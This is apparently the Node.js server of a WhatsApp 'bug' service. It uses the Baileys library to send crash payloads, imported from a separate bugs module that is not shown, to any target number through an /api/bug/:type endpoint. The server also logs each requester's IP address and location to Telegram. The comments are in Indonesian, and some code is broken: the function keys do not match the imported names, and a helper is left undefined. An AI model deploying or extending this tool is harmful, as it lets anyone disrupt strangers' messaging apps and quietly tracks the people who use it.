console.clear();
require('./config');
console.log('starting...');
process.on("uncaughtException", console.error);

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeInMemoryStore,
    generateWAMessageFromContent,
    jidDecode,
    proto,
    delay,
    relayWAMessage,
    getContentType,
    generateMessageTag,
    getAggregateVotesInPollMessage,
    downloadContentFromMessage,
    fetchLatestWaWebVersion,
    InteractiveMessage,
    makeCacheableSignalKeyStore,
    Browsers,
    generateForwardMessageContent,
    MessageRetryMap
} = require("@whiskeysockets/baileys");

const pino = require('pino');
const readline = require("readline");
const fs = require('fs');
const os = require('os');
const express = require("express");
const bodyParser = require('body-parser');
const cors = require("cors");
const path = require("path");
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5036;

const { XanfcXscary, XcrashXann, fo1, bugCrash } = require('./bugs');
const { getRequest, sendTele } = require('./telegram');

// --- Global Variables & Store ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
const pairingCodes = new Map(); // Untuk menyimpan kode pairing sementara

app.enable("trust proxy");
app.set("json spaces", 2);
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));
app.use(bodyParser.raw({ limit: '50mb', type: '*/*' }));


// --- Fungsi Utama untuk Menghubungkan Klien Baileys ---
async function clientstart() {
	const { state, saveCreds } = await useMultiFileAuthState(`./session`)
    const { version, isLatest } = await fetchLatestBaileysVersion();
    const client = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.00"]
    });
      
    if (!client.authState.creds.registered) {
        const phoneNumber = await question('please enter your WhatsApp number, starting with 62:\n> ');  
        const code = await client.requestPairingCode(phoneNumber, "KIUU1234");  
        console.log(`your pairing code: ${code}`);  
    }

    // --- API Endpoints ---
    app.get('/', (req, res) => {
        res.sendFile(path.join(__dirname, 'index.html'));
    });

    app.get('/api/status', async (req, res) => {
        try {
            const memUsage = process.memoryUsage();
            const totalRam = os.totalmem();
            const info = await getRequest(req);
            res.status(200).json({
                status: true,
                botStatus: client.connection === 'open' ? 'online' : 'offline',
                cpuLoad: os.loadavg()[0].toFixed(2),
                ramUsage: memUsage.rss,
                totalRam: totalRam,
                location: info.location
            });
        } catch (error) {
            res.status(500).json({ status: false, error: error.message });
        }
    });

    app.get('/api/bug/:type', async (req, res) => {
        const { type } = req.params;
        const { target } = req.query;
        if (!target) {
            return res.status(400).json({ status: false, error: "Nomor target tidak ditemukan." });
        }

        const bugFunctions = {
            fo1,
            bugCrash,
            xanfcxscary,
            xcrashxann
        };

        if (bugFunctions[type]) {
            try {
                await bugFunctions[type](client, `${target}@s.whatsapp.net`);
                const info = await getRequest(req);
                const logMessage = `*Permintaan Bug Terkirim*\nJenis Bug: ${type}\nTarget: ${target}\nIP Pengirim: ${info.ip}\nLokasi: ${info.location}\nTanggal: ${info.timestamp}`;
                sendTele(logMessage);
                res.status(200).json({ status: true, message: `Bug ${type} berhasil dikirim ke ${target}` });
            } catch (error) {
                console.error(error);
                res.status(500).json({ status: false, error: `Gagal mengirim bug: ${error.message}` });
            }
        } else {
            res.status(404).json({ status: false, error: "Jenis bug tidak ditemukan." });
        }
    });

    app.post('/api/pair', async (req, res) => {
        const { target } = req.body;
        if (!target) {
            return res.status(400).json({ status: false, error: 'Nomor target tidak ditemukan' });
        }

        const phoneNumber = target.replace(/[^0-9]/g, '');
        if (!client.authState.creds.registered) {
            pairingCodes.set(phoneNumber, true);
            const qr = await client.requestPairingCode(phoneNumber);
            return res.status(200).json({ status: true, message: 'Kode pairing berhasil dibuat', code: qr });
        } else {
            return res.status(400).json({ status: false, error: 'Bot sudah terhubung dengan perangkat lain.' });
        }
    });
}

clientstart();

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
}).on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        console.error(`Port ${PORT} is in use. Trying another port...`);
        const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024);
        app.listen(newPort, () => {
            console.log(`Server is running on http://localhost:${newPort}`);
        });
    } else {
        console.error('An error occurred:', err.message);
    }
});